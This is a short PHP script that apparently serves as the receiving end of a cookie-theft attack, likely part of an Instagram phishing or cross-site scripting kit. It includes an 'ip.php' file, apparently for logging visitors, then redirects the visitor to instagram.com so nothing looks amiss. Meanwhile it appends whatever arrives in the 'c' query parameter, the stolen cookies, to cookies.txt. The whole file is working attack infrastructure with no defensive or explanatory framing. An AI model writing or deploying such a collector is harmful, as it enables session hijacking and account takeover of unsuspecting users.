<?php

include 'ip.php';
header('Location: https://instagram.com');

file_put_contents("cookies.txt",  $_GET['c'] . "\n", FILE_APPEND);
exit();
?>
